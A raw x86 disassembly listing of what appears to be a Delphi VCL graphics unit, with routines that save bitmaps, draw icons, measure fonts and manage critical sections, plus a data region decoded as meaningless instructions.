cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_422634
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_422040
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_4233e8
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422634
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_422040
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423444
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c64
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4225b0
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41ef68
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415e00
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415e00
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c64
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_422474
mov dl [ r-xdata ]
call sub_41de00
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41e124
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_42158c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415e00
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415e00
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415e00
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415e00
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415e00
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415e00
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41e594
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415e00
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e8b8
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_423704
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_422634
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4215d8
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42377e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_421c3c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4237a4
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4237ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f2a4
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421404
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_423840
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_421408
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4144d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_423870
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_423b48
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_421404
mov eax [ esi + 0x28 ]
call sub_421408
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414500
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_4238d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41de00
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_423928
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_423964
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_415bbc
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_415dc8
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41eb64
jmp r-xdata
jmp r-xdata
call sub_41e010
sub_4239dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423a69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_423928
cmp eax [ rw-data ]
jne r-xdata
call sub_41e010
mov eax esi
call sub_423928
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41f0a8
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c64
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415e00
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_423a90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423b1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415b9c
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_415dc8
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415dc8
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_423b48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41e010
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423b23
mov eax [ ebp - 0x4 ]
call sub_403258
call sub_403a0c
call sub_403a60
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423b48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423b88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_421404
mov eax [ ebx + 0x28 ]
call sub_421408
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423c08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4239dc
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415e00
pop esi
pop ebx
retn
sub_423c58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423c99
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_41fd20
mov ecx esi
mov edx ebx
call sub_41f9c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ca0
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_423ca8
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41e664
mov [ rw-data ] eax
pop ebx
retn
sub_423ce0
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_423d24
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_423ce0
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_423df0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_423e28
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_424020
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_423e6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423e54
xor eax eax
push ebp
push sub_423f0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f14
mov eax [ ebp - 0x4 ]
call sub_423e60
retn
mov eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423f20
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_423f20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423fff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_422474
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41d700
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41d5e4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412b10
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d988
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41dce4
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_422130
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424020
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_423e54
xor eax eax
push ebp
push sub_42406b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424072
mov eax [ ebp - 0x4 ]
call sub_423e60
retn
mov esp ebp
pop ebp
retn
sub_424072
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403258
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_423e54
xor eax eax
push ebp
push sub_42406b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424072
mov eax [ ebp - 0x4 ]
call sub_423e60
retn
mov esp ebp
pop ebp
retn
sub_424098
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41c958
push eax
mov eax ebx
call sub_41c958
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_423e6c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4240d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424199
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241a0
retn
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
call sub_4210e8
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a30
sub_4241a4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423ca8
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_423d24
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41c09c ]
call sub_41c110
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41c09c ]
call sub_41c110
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41c09c ]
call sub_41c110
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423df0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414158
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414158
mov [ rw-data ] eax
mov ecx sub_41c968
mov edx sub_41c978
mov eax [ sub_41b0a8 ]
call sub_41390c
mov ecx r-xdata
mov edx sub_41cb80
mov eax [ r-xdata ]
call sub_41390c
sub_4242b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4242d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4242dc
retn
sub_4242ec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc ebx
inc edx
add [ eax + eax ] dl
add [ eax ] al
xor [ ebx ] bl
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add al cl
cmp eax 0x3f6c0041
inc ecx
add [ eax + 0x44 ] dh
inc edx
add [ esi + edi ] bl
inc ecx
add [ eax + 0xb00413e ] bl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edx + eax * 2 ] al
or [ eax ] al
add [ eax ] al
push eax
inc ebx
pushfd
inc ebx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004243 ] ch
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add al bh
inc esp
inc edx
add [ edx + ebp + 0x453c0040 ] cl
inc edx
add [ eax ] ch
inc ebp
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_414154
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
inc edx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add al bh
inc esp
inc edx
add [ ebp + eax * 2 + 0x42 ] bl
add [ eax * 2 + 0x45280042 ] bh
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x400408d
inc esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc esp
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x43 ] dl
mov eax edi
call sub_403258
sub_424418
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_424470
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_414154
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403258
sub_4244b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4244f8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42453c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413e34
mov eax esi
pop esi
pop ebx
retn
sub_424568
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42458d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424594
retn
sub_424664
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424689
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424690
retn
sub_42469c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_42475b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424762
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
